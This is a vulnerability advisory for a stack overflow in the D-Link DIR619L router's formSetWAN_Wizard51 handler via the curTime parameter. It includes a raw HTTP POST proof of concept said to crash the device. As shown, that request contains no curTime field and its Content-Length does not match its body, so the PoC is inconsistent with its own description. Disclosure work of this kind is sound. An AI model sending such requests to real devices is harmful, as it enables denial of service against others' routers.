# D-Link Vulnerability

Vendor:D-Link

Product:DIR619L

Version:2.06B01

Type:Stack Overflow

Author:Jiaqian Peng

Mail:pengjiaqian@iie.ac.cn

Institution:Institute of Information Engineering,Chinese Academy of Sciences(IIE, CAS)



## Vulnerability description

We found an stack overflow vulnerability in D-Link router with firmware which was released recently, allows remote attackers to crash the server.

**Stack Overflow**

In `boa` binary:

In the router's `formSetWAN_Wizard51` function, `curTime` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `curTime` to execute arbitrary code.

As you can see here, the input has not been checked. The parameter `curTime` is directly copy to a local variable placed on the stack, which overrides the return address of the function, causing buffer overflow.

<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>

**Supplement**

In order to avoid such problems, we believe that the string content should be checked in the input extraction part.



## PoC

We set `curTime` as **aaaaa......,** , and the router will crash, such as:

```http
POST /goform/formSetWAN_Wizard51 HTTP/1.1
Host: 192.168.100.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1856
Origin: http://192.168.100.1
Connection: close
Referer: http://192.168.100.1/Basic/Wizard_WAN_dhcp.asp
Upgrade-Insecure-Requests: 1

settingsChanged=1&mac_clone=000000000000&&config.pppoe_username=&config.pppoe_password=&mac1=00&mac2=00&mac3=00&mac4=00&mac5=00&mac6=00&mac_cloning_address=00%3A00%3A00%3A00%3A00%3A00&config.mac_cloning_enabled=true&config.wan_dhcp_gw_name=DIR-619L
```



## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
